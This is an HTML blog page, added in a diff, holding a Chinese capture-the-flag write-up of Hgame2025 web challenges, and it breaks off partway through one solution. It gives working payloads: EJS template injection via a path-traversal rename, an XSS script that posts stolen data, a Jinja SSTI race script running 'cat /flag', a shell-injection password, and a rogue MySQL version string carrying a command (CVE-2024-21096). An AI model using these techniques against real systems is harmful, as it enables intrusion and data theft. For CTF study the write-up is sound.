@@ -1,0 +1,888 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="noindex, nofollow">
+<title>Hgame2025-web | 0raN9e&#39;s Blog</title>
+<meta name="keywords" content="ctf">
+<meta name="description" content="Week1
+web
+Level 24 Pacman
+直接去找源码，控制台赋值
+_SCORE=100000
+_LIFE=true;
+得到之后进行base64,栅栏密码解密
+Level 47 BandBomb
+上传恶意EJS文件
+   创建一个包含EJS代码的文件，内容为读取flag的代码：
+aaa.ejs
+   &lt;%= process.env.FLAG || require(&#39;fs&#39;).readFileSync(&#39;/flag&#39;, &#39;utf8&#39;) %&gt;
+使用POST请求上传此文件到/upload接口。
+发送POST请求到/rename接口，将上传的文件重命名为../views/mortis.ejs：
+{
+  &#34;oldName&#34;: &#34;aaa.ejs&#34;,
+  &#34;newName&#34;: &#34;../views/mortis.ejs&#34;
+}
+这会将恶意模板覆盖到原模板文件。
+访问应用首页/，服务器渲染被覆盖的模板，执行其中的代码并显示flag。
+MysteryMessageBoard
+&lt;script&gt;
+    fetch(&#39;/flag&#39;)
+        .then(res =&gt; res.text())
+        .then(flag =&gt; {
+            fetch(&#39;/&#39;, {
+                method: &#39;POST&#39;,
+                headers: {&#39;Content-Type&#39;: &#39;application/x-www-form-urlencoded&#39;},
+                body: &#34;comment=&#34; &#43; flag
+            })
+        })
+&lt;/script&gt;
+中间需要访问/admin再返回触发
+Level 25 双面人派对
+minio,下载main文件看ida,upx脱壳后直接f12看字符得到密钥这些内容
+mc alias set myminio http://node1.hgame.vidar.club:32395 minio_admin JPSQ4NOBvh2/W7hzdLyRYLDm0wNRMG48BL09yOKGpHs=
+然后下载hints里的src
+package main
+
+import (
+	&#34;level25/fetch&#34;
+
+	&#34;level25/conf&#34;
+
+	&#34;github.com/gin-gonic/gin&#34;
+	&#34;github.com/jpillora/overseer&#34;
+)
+
+func main() {
+	fetcher := &amp;fetch.MinioFetcher{
+		Bucket:    conf.MinioBucket,
+		Key:       conf.MinioKey,
+		Endpoint:  conf.MinioEndpoint,
+		AccessKey: conf.MinioAccessKey,
+		SecretKey: conf.MinioSecretKey,
+	}
+	overseer.Run(overseer.Config{
+		Program: program,
+		Fetcher: fetcher,
+	})
+
+}
+
+func program(state overseer.State) {
+	g := gin.Default()
+	g.StaticFS(&#34;/&#34;, gin.Dir(&#34;/&#34;, true))
+	g.Run(&#34;:8080&#34;)
+}
+由代码得是热加载，直接目录映射，在linux环境进行编译打包上传">
+<meta name="author" content="">
+<link rel="canonical" href="http://localhost:1313/posts/ctf/hgame2025/hgame2025/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.343cc480b9ffc8f04ccbe5e968ad674880cab773ec19905e93033065c1e7a804.css" integrity="sha256-NDzEgLn/yPBMy&#43;XpaK1nSIDKt3PsGZBekwMwZcHnqAQ=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/posts/ctf/hgame2025/hgame2025/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="0raN9e&#39;s Blog (Alt + H)">0raN9e&#39;s Blog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/" title="首页">
+                    <span>首页</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/archives/" title="归档">
+                    <span>归档</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/tags/" title="标签">
+                    <span>标签</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/search/" title="搜索">
+                    <span>搜索</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/about/" title="关于">
+                    <span>关于</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/links/" title="友链">
+                    <span>友链</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      Hgame2025-web
+    </h1>
+    <div class="post-meta">
+
+</div>
+  </header> 
+  <div class="post-content"><h1 id="week1">Week1<a hidden class="anchor" aria-hidden="true" href="#week1">#</a></h1>
+<h2 id="web">web<a hidden class="anchor" aria-hidden="true" href="#web">#</a></h2>
+<h3 id="level-24-pacman">Level 24 Pacman<a hidden class="anchor" aria-hidden="true" href="#level-24-pacman">#</a></h3>
+<p>直接去找源码，控制台赋值</p>
+<pre tabindex="0"><code>_SCORE=100000
+_LIFE=true;
+</code></pre><p>得到之后进行base64,栅栏密码解密</p>
+<h3 id="level-47-bandbomb">Level 47 BandBomb<a hidden class="anchor" aria-hidden="true" href="#level-47-bandbomb">#</a></h3>
+<pre tabindex="0"><code>上传恶意EJS文件
+   创建一个包含EJS代码的文件，内容为读取flag的代码：
+aaa.ejs
+   &lt;%= process.env.FLAG || require(&#39;fs&#39;).readFileSync(&#39;/flag&#39;, &#39;utf8&#39;) %&gt;
+</code></pre><p>使用POST请求上传此文件到<code>/upload</code>接口。</p>
+<p>发送POST请求到<code>/rename</code>接口，将上传的文件重命名为<code>../views/mortis.ejs</code>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;oldName&#34;</span>: <span style="color:#e6db74">&#34;aaa.ejs&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;newName&#34;</span>: <span style="color:#e6db74">&#34;../views/mortis.ejs&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>这会将恶意模板覆盖到原模板文件。</p>
+<p>访问应用首页<code>/</code>，服务器渲染被覆盖的模板，执行其中的代码并显示flag。</p>
+<h3 id="mysterymessageboard">MysteryMessageBoard<a hidden class="anchor" aria-hidden="true" href="#mysterymessageboard">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;/flag&#39;</span>)
+</span></span><span style="display:flex;"><span>        .<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">res</span> =&gt; <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">text</span>())
+</span></span><span style="display:flex;"><span>        .<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">flag</span> =&gt; {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;/&#39;</span>, {
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">method</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;POST&#39;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">headers</span><span style="color:#f92672">:</span> {<span style="color:#e6db74">&#39;Content-Type&#39;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;application/x-www-form-urlencoded&#39;</span>},
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">body</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;comment=&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">flag</span>
+</span></span><span style="display:flex;"><span>            })
+</span></span><span style="display:flex;"><span>        })
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span></code></pre></div><p>中间需要访问/admin再返回触发</p>
+<h3 id="level-25-双面人派对">Level 25 双面人派对<a hidden class="anchor" aria-hidden="true" href="#level-25-双面人派对">#</a></h3>
+<p>minio,下载main文件看ida,upx脱壳后直接f12看字符得到密钥这些内容</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mc alias set myminio http://node1.hgame.vidar.club:32395 minio_admin JPSQ4NOBvh2/W7hzdLyRYLDm0wNRMG48BL09yOKGpHs<span style="color:#f92672">=</span>
+</span></span></code></pre></div><p>然后下载hints里的src</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#f92672">package</span> <span style="color:#a6e22e">main</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> (
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;level25/fetch&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;level25/conf&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;github.com/gin-gonic/gin&#34;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;github.com/jpillora/overseer&#34;</span>
+</span></span><span style="display:flex;"><span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">main</span>() {
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">fetcher</span> <span style="color:#f92672">:=</span> <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">fetch</span>.<span style="color:#a6e22e">MinioFetcher</span>{
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">Bucket</span>:    <span style="color:#a6e22e">conf</span>.<span style="color:#a6e22e">MinioBucket</span>,
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">Key</span>:       <span style="color:#a6e22e">conf</span>.<span style="color:#a6e22e">MinioKey</span>,
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">Endpoint</span>:  <span style="color:#a6e22e">conf</span>.<span style="color:#a6e22e">MinioEndpoint</span>,
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">AccessKey</span>: <span style="color:#a6e22e">conf</span>.<span style="color:#a6e22e">MinioAccessKey</span>,
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">SecretKey</span>: <span style="color:#a6e22e">conf</span>.<span style="color:#a6e22e">MinioSecretKey</span>,
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">overseer</span>.<span style="color:#a6e22e">Run</span>(<span style="color:#a6e22e">overseer</span>.<span style="color:#a6e22e">Config</span>{
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">Program</span>: <span style="color:#a6e22e">program</span>,
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">Fetcher</span>: <span style="color:#a6e22e">fetcher</span>,
+</span></span><span style="display:flex;"><span>	})
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">program</span>(<span style="color:#a6e22e">state</span> <span style="color:#a6e22e">overseer</span>.<span style="color:#a6e22e">State</span>) {
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">g</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">gin</span>.<span style="color:#a6e22e">Default</span>()
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">g</span>.<span style="color:#a6e22e">StaticFS</span>(<span style="color:#e6db74">&#34;/&#34;</span>, <span style="color:#a6e22e">gin</span>.<span style="color:#a6e22e">Dir</span>(<span style="color:#e6db74">&#34;/&#34;</span>, <span style="color:#66d9ef">true</span>))
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">g</span>.<span style="color:#a6e22e">Run</span>(<span style="color:#e6db74">&#34;:8080&#34;</span>)
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>由代码得是热加载，直接目录映射，在linux环境进行编译打包上传</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span> mc cp main myminio/prodbucket/update
+</span></span></code></pre></div><h3 id="level-38475-角落">Level 38475 角落<a hidden class="anchor" aria-hidden="true" href="#level-38475-角落">#</a></h3>
+<p>考察一个cve，apche的2024</p>
+<pre tabindex="0"><code>http://node1.hgame.vidar.club:32126/admin/usr/local/apache2/app/%2e%2e%2f../../../../../../usr/local/apache2/app/app.py%3f
+</code></pre><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> Flask, request, render_template, render_template_string, redirect
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> templates
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>app <span style="color:#f92672">=</span> Flask(__name__)
+</span></span><span style="display:flex;"><span>pwd <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>dirname(__file__)
+</span></span><span style="display:flex;"><span>show_msg <span style="color:#f92672">=</span> templates<span style="color:#f92672">.</span>show_msg
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">readmsg</span>():
+</span></span><span style="display:flex;"><span>	filename <span style="color:#f92672">=</span> pwd <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/tmp/message.txt&#34;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>exists(filename):
+</span></span><span style="display:flex;"><span>		f <span style="color:#f92672">=</span> open(filename, <span style="color:#e6db74">&#39;r&#39;</span>)
+</span></span><span style="display:flex;"><span>		message <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
+</span></span><span style="display:flex;"><span>		f<span style="color:#f92672">.</span>close()
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> message
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;No message now.&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/index&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;GET&#39;</span>])
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">index</span>():
+</span></span><span style="display:flex;"><span>	status <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;status&#39;</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> status <span style="color:#f92672">is</span> <span style="color:#66d9ef">None</span>:
+</span></span><span style="display:flex;"><span>		status <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#34;index.html&#34;</span>, status<span style="color:#f92672">=</span>status)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/send&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;POST&#39;</span>])
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">write_message</span>():
+</span></span><span style="display:flex;"><span>	filename <span style="color:#f92672">=</span> pwd <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/tmp/message.txt&#34;</span>
+</span></span><span style="display:flex;"><span>	message <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>form[<span style="color:#e6db74">&#39;message&#39;</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	f <span style="color:#f92672">=</span> open(filename, <span style="color:#e6db74">&#39;w&#39;</span>)
+</span></span><span style="display:flex;"><span>	f<span style="color:#f92672">.</span>write(message) 
+</span></span><span style="display:flex;"><span>	f<span style="color:#f92672">.</span>close()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> redirect(<span style="color:#e6db74">&#39;index?status=Send successfully!!&#39;</span>)
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/read&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;GET&#39;</span>])
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">read_message</span>():
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;{&#34;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> readmsg():
+</span></span><span style="display:flex;"><span>		show <span style="color:#f92672">=</span> show_msg<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;{{message}}&#34;</span>, readmsg())
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> render_template_string(show)
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;waf!!&#39;</span>
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
+</span></span><span style="display:flex;"><span>	app<span style="color:#f92672">.</span>run(host <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;0.0.0.0&#39;</span>, port <span style="color:#f92672">=</span> <span style="color:#ae81ff">5000</span>)
+</span></span></code></pre></div><p>打个条件竞争</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> threading
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://node1.hgame.vidar.club:32126/app&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">send_payload</span>():
+</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;message&#39;</span>: <span style="color:#e6db74">&#39;{{config.__class__.__init__.__globals__[&#34;os&#34;].popen(&#34;cat /flag&#34;).read()}}&#39;</span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    requests<span style="color:#f92672">.</span>post(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>url<span style="color:#e6db74">}</span><span style="color:#e6db74">/send&#34;</span>, data<span style="color:#f92672">=</span>data)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">read_message</span>():
+</span></span><span style="display:flex;"><span>    resp <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>url<span style="color:#e6db74">}</span><span style="color:#e6db74">/read&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;waf!!&#39;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> resp<span style="color:#f92672">.</span>text:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Success! Response: </span><span style="color:#e6db74">{</span>resp<span style="color:#f92672">.</span>text<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
+</span></span><span style="display:flex;"><span>    t1 <span style="color:#f92672">=</span> threading<span style="color:#f92672">.</span>Thread(target<span style="color:#f92672">=</span>send_payload)
+</span></span><span style="display:flex;"><span>    t2 <span style="color:#f92672">=</span> threading<span style="color:#f92672">.</span>Thread(target<span style="color:#f92672">=</span>read_message)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    t1<span style="color:#f92672">.</span>start()
+</span></span><span style="display:flex;"><span>    time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">0.01</span>)
+</span></span><span style="display:flex;"><span>    t2<span style="color:#f92672">.</span>start()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    t1<span style="color:#f92672">.</span>join()
+</span></span><span style="display:flex;"><span>    t2<span style="color:#f92672">.</span>join()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">0.1</span>)
+</span></span></code></pre></div><h1 id="week2">week2<a hidden class="anchor" aria-hidden="true" href="#week2">#</a></h1>
+<h2 id="web-1">web<a hidden class="anchor" aria-hidden="true" href="#web-1">#</a></h2>
+<h3 id="level-21096-honeypot">Level 21096 HoneyPot<a hidden class="anchor" aria-hidden="true" href="#level-21096-honeypot">#</a></h3>
+<p>非预期</p>
+<p>经过测试可以发现导入数据里面可以随便输入，输入密码的地方输入<code>; /writeflag;#</code>然后再访问<code>/flag</code>之后就可以得到flag</p>
+<h3 id="level-21096-honeypot_revenge">Level 21096 HoneyPot_Revenge<a hidden class="anchor" aria-hidden="true" href="#level-21096-honeypot_revenge">#</a></h3>
+<p>是<code>CVE-2024-21096mysqldump</code></p>
+<p>大致思路就是自己用有漏洞版本的mysql，进行远程连接得到shell执行</p>
+<p>在 MySQL 命令行中，<code>\!</code> 用于执行外部命令，比如</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mysql&gt; <span style="color:#ae81ff">\!</span> mysql -u username -p database_name &lt; backup_file.sql
+</span></span></code></pre></div><p>因此</p>
+<pre tabindex="0"><code>sudo apt-get install -y build-essential cmake bison libncurses5-dev libtirpc-dev libssl-dev pkg-config
+wget https://dev.mysql.com/get/Downloads/MySQL-8.0/mysql-boost-8.0.34.tar.gz
+tar -zxvf mysql-boost-8.0.34.tar.gz
+cd mysql-8.0.34
+root@dkcjbRCmYFsaLJs:~/mysql-8.0.34/include# vim mysql_version.h.in
+
+#define MYSQL_SERVER_VERSION       &#34;8.0.0-injection-test\n\\! /writeflag&#34;
+</code></pre><p>然后进行编译(时间较长，浮现的时候可以干些其他的事)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mkdir build
+</span></span><span style="display:flex;"><span>cd build
+</span></span><span style="display:flex;"><span>cmake .. -DDOWNLOAD_BOOST<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> -DWITH_BOOST<span style="color:#f92672">=</span>../boost
+</span></span><span style="display:flex;"><span>make -j<span style="color:#66d9ef">$(</span>nproc<span style="color:#66d9ef">)</span> 
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo make install
+</span></span><span style="display:flex;"><span>sudo groupadd mysql
+</span></span><span style="display:flex;"><span>sudo useradd -r -g mysql -s /bin/false mysql
+</span></span><span style="display:flex;"><span>sudo /usr/local/mysql/bin/mysqld --initialize --user<span style="color:#f92672">=</span>mysql --basedir<span style="color:#f92672">=</span>/usr/local/mysql --datadir<span style="color:#f92672">=</span>/usr/local/mysql/data
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo chown -R mysql:mysql /usr/local/mysql
+</span></span><span style="display:flex;"><span>sudo chown -R mysql:mysql /usr/local/mysql/data
+</span></span><span style="display:flex;"><span>sudo /usr/local/mysql/bin/mysqld_safe --user<span style="color:#f92672">=</span>mysql &amp;
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/usr/local/mysql/bin/mysql -u root 
+</span></span></code></pre></div><p>自己重新设置一个密码</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>FLUSH PRIVILEGES;
+</span></span><span style="display:flex;"><span>ALTER USER <span style="color:#e6db74">&#39;root&#39;</span>@<span style="color:#e6db74">&#39;localhost&#39;</span> IDENTIFIED BY <span style="color:#e6db74">&#39;123456&#39;</span>;
+</span></span><span style="display:flex;"><span>FLUSH PRIVILEGES;
+</span></span><span style="display:flex;"><span>EXIT;
+</span></span></code></pre></div><p>在cnf配置运行</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>mysqld<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>bind-address <span style="color:#f92672">=</span> 0.0.0.0
+</span></span></code></pre></div><p>为了安全起见创建一个用户</p>
